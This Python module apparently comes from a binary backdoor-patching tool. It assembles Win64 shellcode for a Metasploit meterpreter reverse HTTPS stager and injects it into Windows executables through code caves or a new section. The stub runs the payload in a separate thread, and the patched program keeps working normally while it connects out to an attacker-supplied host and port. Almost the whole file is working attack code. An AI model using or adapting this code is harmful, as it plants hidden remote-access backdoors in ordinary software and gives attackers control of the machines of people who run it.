import struct
import os
import logging
from core import enum
from core import support
logger = logging.getLogger(__name__)
from pe.core import eat_code_caves


class meterpreter_reverse_https_threaded():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "meterpreter_reverse_https_threaded"
        self.description = """Compatable with meterpreter reverse https payload from MSF"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             , 'iso-8859-1')
        self.apis_needed = None
        self.payload_type = 'staged'
        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # no encoders
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Win64 version
        """

        #get_payload:  #Jump back with the address for the payload on the stack.
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode2 = b"\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"

        """
         /*
         * windows/x64/meterpreter/reverse_https - 587 bytes (stage 1)
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080,
         * SessionExpirationTimeout=604800,
         * SessionCommunicationTimeout=300,
         * MeterpreterUserAgent=Mozilla/4.0 (compatible; MSIE 6.1;
         * Windows NT), MeterpreterServerName=Apache,
         * ReverseListenerBindPort=0,
         * HttpUnknownRequestResponse=<html><body><h1>It
         * works!</h1></body></html>, EnableStageEncoding=false,
         * PrependMigrate=false, EXITFUNC=thread, AutoLoadStdapi=true,
         * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
         * EnableUnicodeEncoding=true
         */
        """
        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 90

        #payload
        host_len = len(bytes(self.HOST, 'iso-8859-1')) + 1
        self.shellcode2 += bytes("\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
                                 "\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                                 "\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                                 "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                                 "\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48"
                                 "\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
                                 "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
                                 "\x40\x20\x49\x01\xd0\x8b\x48\x18\x50\xe3\x56\x4d\x31\xc9\x48"
                                 "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
                                 "\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
                                 "\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
                                 "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
                                 "\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
                                 "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
                                 "\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69"
                                 "\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
                                 "\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
                                 "\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5"
                                 "\xe8", 'iso-8859-1')

        self.shellcode2 += struct.pack("<I", host_len)

        self.shellcode2 += bytes(self.HOST, 'iso-8859-1')
        self.shellcode2 += b"\x00"

        self.shellcode2 += b"\x5a\x48\x89\xc1\x49\xc7\xc0"

        self.shellcode2 += struct.pack("<H", int(self.PORT))

        self.shellcode2 += bytes("\x00\x00\x4d\x31"
                                 "\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f\xc6\x00\x00\x00"
                                 "\x00\xff\xd5\xe8\x5b\x00\x00\x00\x2f\x30\x32\x31\x64\x4c\x5a"
                                 "\x6a\x74\x75\x63\x4f\x32\x32\x37\x66\x5a\x31\x35\x42\x68\x77"
                                 "\x67\x35\x6e\x63\x68\x43\x5a\x51\x53\x62\x58\x65\x38\x6d\x76"
                                 "\x54\x65\x44\x61\x34\x66\x52\x44\x4e\x5a\x33\x2d\x68\x4c\x30"
                                 "\x6d\x61\x64\x42\x78\x57\x6e\x45\x35\x4e\x49\x6a\x68\x33\x7a"
                                 "\x35\x45\x45\x61\x77\x41\x38\x53\x67\x54\x73\x6c\x31\x66\x71"
                                 "\x57\x6f\x52\x71\x57\x63\x34\x51\x00\x48\x89\xc1\x53\x5a\x41"
                                 "\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00"
                                 "\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6"
                                 "\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00"
                                 "\x49\x89\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00"
                                 "\x00\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9"
                                 "\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85"
                                 "\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35"
                                 "\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8"
                                 "\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10"
                                 "\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00"
                                 "\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48"
                                 "\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12"
                                 "\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0"
                                 "\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58"
                                 "\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5",
                                 'iso-8859-1')
        
        self.shellcode1 = bytes("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to itterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               #; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               #; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               #  ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               #; We now automagically return to the correct caller...
                           #get_next_mod: ;
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           #get_next_mod1: ;
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           , 'iso-8859-1')
        #allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += bytes("\x00\x00"
                            "\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            , 'iso-8859-1')
                                                                #mov rcx, 0x1abE
        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"

        #call the get_payload right before the payload
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x43"

                            # got_payload:
        self.shellcode1 += bytes("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"                          # xor rax,rax
                            "\x50"                                  # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      # add rsp, 50
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            , 'iso-8859-1')

        
        #Jump to the win64 return to normal execution code segment.
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += b"\xE9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
            #self.shellcode1 += "\xE9\x47\x02\x00\x00"

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
